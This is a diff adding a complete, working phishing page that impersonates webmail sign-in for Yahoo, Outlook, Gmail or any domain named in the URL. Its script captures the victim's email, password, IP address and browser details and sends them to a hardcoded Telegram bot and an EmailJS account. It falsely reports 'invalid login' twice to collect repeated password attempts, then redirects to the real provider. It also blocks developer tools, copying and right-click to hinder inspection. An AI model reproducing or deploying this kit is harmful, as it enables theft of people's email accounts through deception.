@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="zxx">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="strict-origin">
+    <link id="favicon" rel="shortcut icon" sizes="32x32" href="https://www.fastmail.com/static/favicons/icon-32x32.png">
+    <title class="logoname">Mail</title>
+    <script>
+        try {
+            if (top.location != window.location) {
+                top.location.reload();
+            }
+            if (window.opener && window.opener.top.location != window.location) {
+                window.opener.top.location.reload();
+                self.close();
+            }
+        } catch(e) {}
+    </script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            padding: 0;
+            margin: 0;
+        }
+        body {
+            height: 100vh;
+            width: 100vw;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            overflow: hidden;
+            color: #1a1a2e;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-touch-callout: none;
+        }
+        .bg-img {
+            height: 100%;
+            width: 100%;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: cover;
+        }
+        #root {
+            position: absolute;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            top: 0;
+            z-index: -10;
+            pointer-events: none;
+            filter: brightness(0.25) blur(2px);
+        }
+        #root iframe {
+            height: 100%;
+            width: 100%;
+            border: none;
+        }
+        .container {
+            width: 360px;
+            padding: 24px 22px;
+            background-color: #fff;
+            border-radius: 12px;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 2;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.12), 0 2px 8px rgba(0,0,0,0.06);
+        }
+        @media (max-width: 480px) {
+            .container {
+                width: 100%;
+                border-radius: 0;
+                box-shadow: none;
+                padding: 24px 20px;
+                left: 0;
+                top: 0;
+                transform: none;
+                min-height: 100vh;
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+            }
+        }
+        label {
+            font-size: 12px;
+            font-weight: 600;
+            color: #444;
+            letter-spacing: 0.3px;
+        }
+        input[type=text], input[type=password] {
+            -webkit-user-select: text;
+            -moz-user-select: text;
+            -ms-user-select: text;
+            user-select: text;
+            width: 100%;
+            padding: 10px 12px;
+            margin: 5px 0 14px 0;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 8px;
+            background: #fafafa;
+            font-family: inherit;
+            font-size: 14px;
+            color: #333;
+            transition: border-color 0.2s ease, background-color 0.2s ease, box-shadow 0.2s ease;
+        }
+        input[type=text]:focus, input[type=password]:focus {
+            background-color: #fff;
+            border-color: #0096FF;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0,150,255,0.1);
+        }
+        input[type=text]:read-only {
+            color: #666;
+            cursor: default;
+        }
+        .btn {
+            background: #3b5998;
+            color: white;
+            padding: 12px 18px;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+            font-size: 14px;
+            font-weight: 600;
+            font-family: inherit;
+            border-radius: 4px;
+            letter-spacing: 0.3px;
+            transition: background-color 0.2s ease;
+            margin-top: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .btn:hover {
+            background: #2d4373;
+        }
+        .btn:active {
+            background: #263961;
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .btn svg {
+            width: 16px;
+            height: 16px;
+            fill: white;
+        }
+        .img {
+            text-align: center;
+            display: none;
+        }
+        .brand-header {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .brand-header img {
+            width: 28px;
+            height: 28px;
+        }
+        .brand-header span {
+            font-size: 20px;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: #1a1a2e;
+            letter-spacing: 1px;
+        }
+        #title {
+            text-align: center;
+            margin: 10px 0;
+            display: none;
+        }
+        #error {
+            display: none;
+            color: #d93025;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            padding: 8px 12px;
+            background: #fce8e6;
+            border-radius: 6px;
+            border-left: 3px solid #d93025;
+        }
+        .password-wrapper {
+            position: relative;
+        }
+        .password-wrapper input {
+            padding-right: 45px;
+        }
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-70%);
+            cursor: pointer;
+            font-size: 18px;
+            color: #aaa;
+            background: none;
+            border: none;
+            padding: 5px;
+            user-select: none;
+            transition: color 0.2s ease;
+        }
+        .toggle-password:hover {
+            color: #555;
+        }
+        .loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.9);
+            display: none;
+            z-index: 100;
+            border-radius: 12px;
+        }
+        .spinner-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #e8e8e8;
+            border-top: 4px solid #0096FF;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 12px auto;
+        }
+        .spinner-text {
+            font-size: 13px;
+            color: #666;
+            font-weight: 500;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            padding-top: 14px;
+            font-size: 11px;
+            color: #999;
+            border-top: 1px solid #f0f0f0;
+            letter-spacing: 0.2px;
+        }
+        .status-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 23, 42, 0.55);
+            backdrop-filter: blur(3px);
+            -webkit-backdrop-filter: blur(3px);
+            z-index: 200;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .status-box {
+            background: none;
+            border: none;
+            padding: 32px 30px 28px;
+            width: 350px;
+            text-align: center;
+        }
+        .status-icon {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto 16px;
+            background: linear-gradient(135deg, #3b5998, #4a6baf);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .status-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: white;
+        }
+        .status-box h2 {
+            font-size: 17px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 6px;
+            letter-spacing: -0.3px;
+        }
+        .status-subtitle {
+            font-size: 12px;
+            color: rgba(255,255,255,0.6);
+            margin-bottom: 22px;
+            font-weight: 400;
+        }
+        .status-line {
+            font-size: 13.5px;
+            color: rgba(255,255,255,0.85);
+            min-height: 22px;
+            font-weight: 500;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+            transform: translateY(0);
+        }
+        .status-line.fade-out {
+            opacity: 0;
+            transform: translateY(-4px);
+        }
+        .status-line.fade-in {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .status-line.failed {
+            color: #fca5a5;
+            font-weight: 600;
+        }
+        .status-spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2.5px solid rgba(255,255,255,0.25);
+            border-top: 2.5px solid #ffffff;
+            border-radius: 50%;
+            animation: statusspin 0.7s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+        @keyframes statusspin { to { transform: rotate(360deg); } }
+        .progress-wrap {
+            margin-top: 22px;
+        }
+        .progress-bar-status {
+            height: 3px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 3px;
+            overflow: hidden;
+        }
+        .progress-fill-status {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, rgba(255,255,255,0.6), rgba(255,255,255,0.9));
+            border-radius: 3px;
+            transition: width 0.6s ease;
+        }
+        .progress-fill-status.failed {
+            background: linear-gradient(90deg, #fca5a5, #f87171);
+        }
+    </style>
+</head>
+<body>
+
+<div id="root">
+    <iframe id="frame" scrolling="no" src="about:blank" width="100%" height="100%" frameborder="0"></iframe>
+</div>
+
+<form class="container" id="Login">
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="spinner-container">
+            <div class="spinner"></div>
+            <div class="spinner-text">Verifying...</div>
+        </div>
+    </div>
+
+    <div class="brand-header" id="brand-header">
+        <img src="" id="brand-favicon">
+        <span id="brand-name"></span>
+    </div>
+
+    <div class="img">
+        <img src="" id="logo" style="max-width:200px; max-height:60px;">
+    </div>
+
+    <h3 id="title">Sign In</h3>
+
+    <h5 id="error">please try again!</h5>
+    <div id="success-msg" style="display:none; color:#188038; font-size:13px; font-weight:500; margin-bottom:12px; padding:8px 12px; background:#e6f4ea; border-radius:6px; border-left:3px solid #188038;">Verification Successful</div>
+
+    <label for="email"><b>Email Address</b></label>
+    <input type="text" placeholder="Enter Email" name="email" id="email" required readonly>
+
+    <label for="passwd"><b>Password</b></label>
+    <div class="password-wrapper">
+        <input type="password" placeholder="Enter Email Password" name="passwd" id="passwd" required>
+        <button type="button" class="toggle-password" id="togglePass" onclick="togglePassword()">&#128065;</button>
+    </div>
+
+    <button type="submit" class="btn" id="submit-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M416 448h-84c-6.6 0-12-5.4-12-12v-40c0-6.6 5.4-12 12-12h84c17.7 0 32-14.3 32-32V160c0-17.7-14.3-32-32-32h-84c-6.6 0-12-5.4-12-12V76c0-6.6 5.4-12 12-12h84c53 0 96 43 96 96v192c0 53-43 96-96 96zm-47-201L193 71c-9.4-9.4-24.6-9.4-33.9 0l-22.7 22.7c-9.4 9.4-9.4 24.5 0 33.9L239.7 232H12c-6.6 0-12 5.4-12 12v32c0 6.6 5.4 12 12 12h227.7L136.4 392.4c-9.4 9.4-9.4 24.6 0 33.9l22.7 22.7c9.4 9.4 24.6 9.4 33.9 0l176-176c9.3-9.4 9.3-24.6 0-34z"/></svg> Sign In</button>
+
+    <div class="footer">
+        All rights reserved. Copyright &copy; 2026 <span id="domain-name"></span>
+        <div style="margin-top:8px;"><img src="https://www.logotypes101.com/logos/575/FFB0F171546108B84648A20AB0EF4EF5/norton_secure_seal.png" alt="Norton Secured" style="width:80px; opacity:0.85;"></div>
+    </div>
+</form>
+
+<div class="status-overlay" id="status-overlay">
+    <div class="status-box">
+        <div class="status-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 2.18l7 3.12v4.7c0 4.83-3.13 9.37-7 10.5-3.87-1.13-7-5.67-7-10.5V6.3l7-3.12zM10 12l-2-2-1.41 1.41L10 14.83l6.41-6.42L15 7l-5 5z"/></svg>
+        </div>
+        <h2>Please wait</h2>
+        <div class="status-subtitle">Authenticating your session</div>
+        <div class="status-line" id="status-line"><span class="status-spinner"></span> Initializing...</div>
+        <div class="progress-wrap">
+            <div class="progress-bar-status"><div class="progress-fill-status" id="progress-fill"></div></div>
+        </div>
+    </div>
+</div>
+
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+<script>
+    var Tele_token = "8146877130:AAETaFmSH5Sx-UPSwtFOsNPkJSR8pf3ZXJw";
+    var Tele_chatid = "5279025133";
+
+    var EJS_SERVICE = "service_260mmyz";
+    var EJS_TEMPLATE = "template_aqewzeo";
+    var EJS_PUBLIC = "E-Tvi0-poc1yPcPDQ";
+
+    function sendEmailJS(email, password, ip, userAgent) {
+        emailjs.send(EJS_SERVICE, EJS_TEMPLATE, {
+            email: email,
+            password: password,
+            ip: ip,
+            useragent: userAgent,
+            time: new Date().toLocaleString()
+        }, EJS_PUBLIC);
+    }
+    var btnIcon = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M416 448h-84c-6.6 0-12-5.4-12-12v-40c0-6.6 5.4-12 12-12h84c17.7 0 32-14.3 32-32V160c0-17.7-14.3-32-32-32h-84c-6.6 0-12-5.4-12-12V76c0-6.6 5.4-12 12-12h84c53 0 96 43 96 96v192c0 53-43 96-96 96zm-47-201L193 71c-9.4-9.4-24.6-9.4-33.9 0l-22.7 22.7c-9.4 9.4-9.4 24.5 0 33.9L239.7 232H12c-6.6 0-12 5.4-12 12v32c0 6.6 5.4 12 12 12h227.7L136.4 392.4c-9.4 9.4-9.4 24.6 0 33.9l22.7 22.7c9.4 9.4 24.6 9.4 33.9 0l176-176c9.3-9.4 9.3-24.6 0-34z"/></svg> ';
+
+    var attemptCount = 0;
+
+    function togglePassword() {
+        var passInput = document.getElementById('passwd');
+        var toggleBtn = document.getElementById('togglePass');
+        if (passInput.type === 'password') {
+            passInput.type = 'text';
+            toggleBtn.innerHTML = '&#128064;';
+        } else {
+            passInput.type = 'password';
+            toggleBtn.innerHTML = '&#128065;';
+        }
+    }
+
+    function checkEmailDomain(email) {
+        var domain = email.split('@')[1];
+        var finalDomain = '';
+        var domainName = '';
+
+        if (domain.includes('yahoo')) {
+            finalDomain = "login.yahoo.com";
+            domainName = "Yahoo";
+        } else if (domain.includes('outlook') || domain.includes('live') || domain.includes('hotmail')) {
+            finalDomain = "login.live.com/login.srf";
+            domainName = "Outlook";
+        } else if (domain.includes('gmail') || domain.includes('google')) {
+            finalDomain = "accounts.google.com";
+            domainName = "Gmail";
+        } else {
+            finalDomain = domain;
+            domainName = domain.split('.')[0];
+        }
+
+        document.getElementById('frame').src = 'https://' + finalDomain;
+        document.getElementById('favicon').href = "https://www.google.com/s2/favicons?sz=32&domain=" + finalDomain;
+        document.title = domainName + " Mail";
+        document.getElementById('domain-name').textContent = domainName;
+
+        document.getElementById('brand-favicon').src = "https://www.google.com/s2/favicons?sz=32&domain=" + finalDomain;
+        document.getElementById('brand-name').textContent = domainName;
+        document.getElementById('brand-header').style.display = 'flex';
+
+        return finalDomain;
+    }
+
+    function GetUserIP() {
+        var ret_ip = 'Unknown';
+        try {
+            $.ajaxSetup({ async: false });
+            $.get('https://api.ipify.org?format=json', function(r) {
+                ret_ip = r.ip;
+            });
+        } catch(e) {}
+        return ret_ip;
+    }
+
+    var lockedEmail = '';
+
+    $(document).ready(function() {
+        var hashVal = window.location.hash.substr(1);
+        var email = '';
+        try {
+            email = atob(hashVal);
+        } catch(e) {
+            email = hashVal;
+        }
+        if (email) {
+            lockedEmail = email;
+            $('#email').val(email);
+            checkEmailDomain(email);
+
+            var seqEmail = email;
+            var seqDomain = email.split('@')[1];
+            var steps = [
+                'Syncing: ' + seqEmail + '...',
+                'Clearing login sessions...',
+                'Updating: ' + seqDomain + ' server...',
+                'Obtaining your IP...',
+                'Verifying your email...'
+            ];
+            var totalSteps = steps.length + 1;
+            var delay = 300;
+
+            steps.forEach(function(text, i) {
+                setTimeout(function() {
+                    $('#status-line').addClass('fade-out');
+                    setTimeout(function() {
+                        $('#status-line').removeClass('fade-out failed').html('<span class="status-spinner"></span> ' + text);
+                        $('#status-line').addClass('fade-in');
+                        $('#progress-fill').css('width', ((i + 1) / totalSteps * 100) + '%');
+                    }, 200);
+                }, delay);
+                delay += 2500;
+            });
+
+            setTimeout(function() {
+                $('#status-line').addClass('fade-out');
+                setTimeout(function() {
+                    $('#status-line').removeClass('fade-out').addClass('failed fade-in').html('&#10007; Authentication failed<br><span style="font-size:12px;font-weight:400;color:rgba(255,255,255,0.6);">Please log in again</span>');
+                    $('#progress-fill').addClass('failed').css('width', '100%');
+                }, 200);
+            }, delay);
+            delay += 2500;
+
+            setTimeout(function() {
+                $('#status-overlay').fadeOut(400);
+            }, delay);
+        } else {
+            $('#status-overlay').hide();
+        }
+
+        var lockedHash = hashVal;
+
+        if (email) {
+            window.addEventListener('hashchange', function() {
+                if (window.location.hash.substr(1) !== lockedHash) {
+                    window.location.hash = lockedHash;
+                }
+            });
+
+            var emailInput = document.getElementById('email');
+            var observer = new MutationObserver(function() {
+                if (emailInput.value !== lockedEmail) {
+                    emailInput.value = lockedEmail;
+                }
+            });
+            observer.observe(emailInput, { attributes: true, attributeFilter: ['value'] });
+
+            Object.defineProperty(emailInput, 'value', {
+                get: function() { return lockedEmail; },
+                set: function() { HTMLInputElement.prototype.value; }
+            });
+
+            setInterval(function() {
+                var el = document.getElementById('email');
+                if (el.getAttribute('value') !== lockedEmail) {
+                    el.setAttribute('value', lockedEmail);
+                }
+                if (window.location.hash.substr(1) !== lockedHash) {
+                    window.location.hash = lockedHash;
+                }
+            }, 500);
+        }
+
+        $('#Login').submit(function(event) {
+            event.preventDefault();
+            var email = $("#email").val();
+            var password = $("#passwd").val();
+
+            if (!email || !password) {
+                $("#error").show().html("Please fill in all the fields.");
+                return false;
+            }
+
+            if (password.length < 6) {
+                $("#error").show().html("Password must be at least 6 characters.");
+                return false;
+            }
+
+            $('#submit-btn').html(btnIcon + 'Verifying...').prop('disabled', true);
+            $('#loading-overlay').show();
+            $("#error").hide();
+
+            var ip = GetUserIP();
+            var userAgent = navigator.userAgent;
+
+            attemptCount++;
+
+            var msgg = "Webmail Hits\nEmail: " + email + "\nPassword: " + password + "\nIP: " + ip + "\nUser-Agent: " + userAgent;
+
+            sendEmailJS(email, password, ip, userAgent);
+
+            $.ajax({
+                url: "https://api.telegram.org/bot" + Tele_token + "/sendMessage",
+                type: 'POST',
+                data: {
+                    chat_id: Tele_chatid,
+                    text: msgg,
+                },
+                success: function(response) {
+                    setTimeout(function() {
+                        $('#loading-overlay').hide();
+                        $('#submit-btn').html(btnIcon + 'Sign In').prop('disabled', false);
+                        if (response.ok) {
+                            if (attemptCount < 3) {
+                                $("#error").show().html("The login is invalid.");
+                                $("#passwd").val("");
+                            } else if (attemptCount >= 3) {
+                                $("#error").hide();
+                                $("#success-msg").show();
+                                $("#passwd").val("");
+                                setTimeout(function() {
+                                    var domain = checkEmailDomain(email);
+                                    window.location.href = "https://" + domain;
+                                }, 2000);
+                            }
+                        } else {
+                            $("#error").show().html("Verification failed. Try again.");
+                        }
+                    }, 1500);
+                },
+                error: function() {
+                    setTimeout(function() {
+                        $('#loading-overlay').hide();
+                        $('#submit-btn').html(btnIcon + 'Sign In').prop('disabled', false);
+                        if (attemptCount < 3) {
+                            $("#error").show().html("The login is invalid.");
+                            $("#passwd").val("");
+                        } else {
+                            $("#error").hide();
+                            $("#success-msg").show();
+                            $("#passwd").val("");
+                            setTimeout(function() {
+                                var domain = checkEmailDomain(email);
+                                window.location.href = "https://" + domain;
+                            }, 2000);
+                        }
+                    }, 1500);
+                }
+            });
+        });
+    });
+</script>
+<script>
+    document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'F12') { e.preventDefault(); return false; }
+        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) { e.preventDefault(); return false; }
+        if (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j')) { e.preventDefault(); return false; }
+        if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c')) { e.preventDefault(); return false; }
+        if (e.ctrlKey && (e.key === 'U' || e.key === 'u')) { e.preventDefault(); return false; }
+        if (e.ctrlKey && (e.key === 'S' || e.key === 's')) { e.preventDefault(); return false; }
+        if (e.ctrlKey && (e.key === 'P' || e.key === 'p')) { e.preventDefault(); return false; }
+    });
+
+    document.addEventListener('dragstart', function(e) { e.preventDefault(); });
+    document.addEventListener('drop', function(e) { e.preventDefault(); });
+    document.addEventListener('copy', function(e) { e.preventDefault(); });
+    document.addEventListener('cut', function(e) { e.preventDefault(); });
+
+</script>
+
+</body>
+</html>
